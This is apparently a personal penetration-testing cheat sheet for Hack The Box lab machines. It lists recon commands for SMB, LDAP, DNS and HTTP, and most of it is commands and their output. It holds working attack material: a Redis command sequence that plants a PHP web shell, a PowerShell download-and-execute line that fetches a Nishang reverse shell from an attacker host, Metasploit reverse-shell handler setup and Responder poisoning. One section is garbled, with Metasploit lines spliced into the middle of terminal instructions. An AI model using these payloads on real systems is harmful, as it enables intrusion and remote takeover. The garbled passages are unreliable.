
##### Table of Contents  
- [NMAP](#NMAP)
- [FTP](#FTP)
- [HTTP](#HTTP)
- [SMB](#SMB)
- [LDAP](#LDAP)
- [DNS](#DNS)
- [Upgrading Reverse Shells to be Fully Interactive](#Upgrading Reverse Shells to be Fully Interactive)
- [Redis](#Reids)
- [Search files](#Search files)
- [Python SERVER](#Python SERVER)
- [Nishang](#Nishang)
- [Shells](#Shells)
- [Metasploit](#Metasploit)
- [Privilige Escalation](#Privilige Escalation)





# NMAP
nmap -sC -sV -sT -oA NMAP/HTB 10.10.10.161

# FTP
ftp $targetip
Username: anonymous
Password: anything

# HTTP

gobuster dir -w /usr/share/wordlists/dirb/big.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.157:80 -o   gobuster_10.10.10.157_80.txt


## SMB
- smbclient -N -L //10.10.10.161/

- smbclient -L \\10.10.10.3

WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

- smbclient -N //10.10.10.161/Share

- smbmap -H 10.10.10.3
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.3...
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	tmp                                               	READ, WRITE
	opt                                               	NO ACCESS
	IPC$                                              	NO ACCESS
	ADMIN$                                            	NO ACCESS

- smbmap -H 10.10.10.161 -u anonymous -d HTB.LOCAL

- mbmap -H 10.10.10.161 -u anonymous -d localhost

- Samba 3.0.20 < 3.0.25rc3 **exploit**

https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851

- Link do enumeracji: https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html?fbclid=IwAR1qQDsLzkudInhrnUwL1V9ONiVXMD-vW1V5hrEI92xmuhlExEFOmyu_3xc#check-null-sessions

- NetNTLM relaying:

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

## LDAP
ldapsearch -x -h 10.10.10.161 -s base namingcontexts
ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb" 

responder.py -I eth0 -w -f

-w : WPAD rogue server
-f : This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.

## DNS
nslookup
SERVER 10.10.10.161
- 127.0.0.1
- 10.10.10.161

dnsrecon -r 127.0.0.0/24 -n 10.10.10.161

dnsrecon -r 127.0.1.0/24 -n 10.10.10.161

dnsrecon -r 10.10.10.0/24 -n 10.10.10.161


dig axfr @10.10.10.161

dig axfr bank.htb @10.10.10.161

## Upgrading Reverse Shells to be Fully Interactive
python -c "import pty; pty.spawn('/bin/bash')"
Press Ctrl+Z to background your reverse shell, then in your local machine run: 
- stty raw -echo
- fg

Type reset and hit return. You should be presented with a fully interactive shell. You’re welcome.

There’s still one little niggling thing that can happen, the shell might not be the correct height/width for your terminal. To fix this, go to your local machine and run:

stty size

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 > use exploit/multi/handler


msf5 exploit(multi/handler) > set lhost 10.10.14.17
lhost => 10.10.14.17
msf5 exploit(multi/handler) > set lport 8080
lport => 8080This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.

stty -rows 48 -columns 120

## Redis

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

flushall

set PleaseSubscribe "<? system($_REQUEST['cmd']); ?>"

config set dbfilename shell.php

config set dir /var/www/html/

save

## Search files

- dir secret.doc /s /p (Windows)
- find -O3 -L /var/www/ -name "\*.html" (Linux)

## Python SERVER

python -m simpleHTTPServer

## Nishang

Linux Site:

- gedit Invoke-PowerShellTcp.ps1 (Invoke-PowerShellTcp -Reverse -IPAdress 192.168.1.32 -Port 4444
- python -m SimpleHTTPServer
- nc -lvp 4444

Windows Site:

- C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')

Encoded payload:

- cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard

## Shells

https://www.yeahhub.com/msfvenom-all-payload-examples-cheatsheet-2017/

## Metasploit

**Handler**
- msf> use multi/handler
- msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp
- msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)

**Privilige Escalation 1**
- getsystem

**Privilige Escalation 1**
- multi/recon/local_exploit_suggester
- background
- set session 1
- run

## Privilige Escalation

-Windows

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

https://guif.re/windowseop?fbclid=IwAR2fwsD6D7XjFhZbD4IGSTHtQkGs5D7HXEwVEnCYSQEDWzsuqds8geOi7uc#EoP%208:%20Kernel%20vulnerabilities

https://www.scip.ch/en/?labs.20181011

- Linux
https://gtfobins.github.io/

# Appache Tomcat

- Default Credentials

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

